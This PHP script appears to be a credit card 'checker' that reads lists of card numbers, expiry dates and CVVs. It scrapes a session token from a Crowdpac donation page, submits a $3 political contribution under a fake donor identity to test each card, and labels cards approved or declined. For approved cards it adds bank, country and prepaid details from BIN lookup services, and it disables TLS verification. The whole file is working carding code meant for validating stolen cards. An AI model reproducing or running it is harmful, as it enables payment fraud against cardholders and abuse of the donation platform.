<?php


set_time_limit(0);
error_reporting(0);
date_default_timezone_set('America/Sao_Paulo');

function GetStr($string, $start, $end)
{
    $str = explode($start, $string);
    $str = explode($end, $str[1]);
    return $str[0];
}
extract($_GET);
$lista = str_replace(" " , "", $lista);
$separar = explode("|", $lista);
$cc = $separar[0];
$mes = $separar[1];
$ano = $separar[2];
$cvv = $separar[3];



$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://www.crowdpac.com/contribute/365069');
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
$pagamento = curl_exec($ch);

$token = trim(strip_tags(getstr($pagamento,'name="_token" type="hidden" value="','"')));
$number1 = substr($cc,0,4);
$number2 = substr($cc,4,4);
$number3 = substr($cc,8,4);
$number4 = substr($cc,12,4);

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://www.crowdpac.com/apiv2/contribution/contribute/crowdpac/365069');
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_POSTFIELDS, '_token='.$token.'&is_pledge=0&undeclared_candidate=1&amount=%243.00&tip_amount=0.30000000000000004&fees_amount=0.42&fee_percentage=0.0375&fee_additional=30&show_tip_jar=1&show_fees=1&crowdpac_fee_additional_percentage=&amounts=%7B%22candidates%22%3A%7B%221528%22%3A%22%243.00%22%7D%2C%22organizations%22%3A%7B%7D%7D&has_contribution_limit=1&min_individual=1&max_individual=2700&max_couple=5400&can_couple_donate=1&mode=crowdpac&source_code=&ref_code=&crowdpac_id=365069&employer_address_required=0&donate-other=&donate-other-couple=&candidate_amount%5B1528%5D=%243.00&name=Geovane+Silva&email=geovana%40gmail.com&public=1&address=Street+r3&city=NY&state=AK&zip=10001&employer=Student&occupation=Student&student=Student&is_couple=0&spouse1_name=&spouse1_email=&couple_public=1&spouse1_employer=&spouse1_occupation=&spouse2_name=&spouse2_email=&spouse2_employer=&spouse2_occupation=&payment_method=credit_card&cc_number='.$number1. "+" .$number2. "+" .$number3. "+" .$number4. '&cc_verification_value='.$cvv.'&cc_month='.$mes.'&cc_year='.$ano.'&ach_account_type=checking&ach_account_number=&ach_routing_number=&email_on_update=0&accept_contribution_rules=1');
$pagamento = curl_exec($ch);
if (strpos($pagamento, 'There was a problem storing your payment method. Please verify your payment details are correct and try again')) { 
	echo '<span class="label label-danger">#Reprovada ❌ '.$lista.' #GIOVANE SILVA<br></span>';

}
 else {
 $bin = substr($cc, 0,6);
$binn = substr($cc, 0,6);

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://www.cardbinlist.com/search.html?bin='.$bin);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
$bin = curl_exec($ch);
$level     = trim(strip_tags(getstr($bin,'Card Sub Brand</th>','</td>')));
curl_close($ch);

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://lookup.binlist.net/'.$binn);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
$bin = curl_exec($ch);
curl_close($ch);
$data = date("d/m/Y H:i:s");
$pais = trim(strip_tags(getstr($bin,'country":{"alpha2":"','"')));
$banco     = trim(strip_tags(getstr($bin,'"bank":{"name":"','"')));
$brand     = trim(strip_tags(getstr($bin,'"scheme":"','"')));
$fone = trim(strip_tags(getstr($bin,'"phone":"','"')));
$tipo = trim(strip_tags(getstr($bin,'},"type":"','"')));
$latitude = trim(strip_tags(getstr($bin,'latitude":',',')));
$logitude = trim(strip_tags(getstr($bin,'longitude":','}}')));
$prepago = trim(strip_tags(getstr($bin,'"prepaid":',',')));
$valores = array('R$ 1,00','R$ 5,00','R$ 1,40','R$ 4,80','R$ 2,00','R$ 7,00','R$ 10,00','R$ 3,00','R$ 3,40','R$ 5,50');
$debitouu = $valores[mt_rand(0,9)];
 echo '<span class="label label-success">#Aprovada ✅ '.$lista.' #GIOVANE SILVA | Informaçoes | BIN: '.$binn.' | PAIS: '.$pais.' | BANCO: '.$banco.' | BANDEIRA: '.$brand.' | NIVEL: '.$level.' | PRÉ-PAGO : '.$prepago.' | <br>PHONE : '.$fone.' | TIPO : '.$tipo.' | LATITUDE : '.$latitude.' | LONGITUDE : '.$logitude.' | GERADA 💳 | DATA: '.$data.' | GATE [GR] | DEBITOU: '.$debitouu.'</span> <br>';
  
  }
 
curl_close($ch);
ob_flush();
?>